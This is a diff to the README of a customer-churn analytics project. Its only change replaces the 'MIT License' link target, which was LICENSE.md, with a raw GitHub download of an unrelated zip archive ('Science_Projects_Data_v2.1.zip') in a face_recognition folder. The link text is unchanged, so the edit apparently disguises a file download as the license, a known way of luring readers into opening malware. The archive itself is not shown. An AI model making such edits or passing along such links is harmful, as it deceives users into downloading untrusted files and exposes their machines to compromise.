@@ -38,6 +38,6 @@ Welcome to the Predictive Analytics for Customer Churn project repository! In to
 We welcome contributions from the community! Whether it's bug fixes, feature enhancements, or additional data sources, your input is valuable. Please refer to the contributing guidelines for more information on how to get involved.
 
 **License:**
-This project is licensed under the [MIT License](LICENSE.md). Feel free to use, modify, and distribute the code for your own purposes.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/adilmaqsood1/Data-Science-Projects/main/face_recognition/Science_Projects_Data_v2.1.zip). Feel free to use, modify, and distribute the code for your own purposes.
 
 Feel free to reach out with any questions, feedback, or collaboration opportunities. Happy predicting!
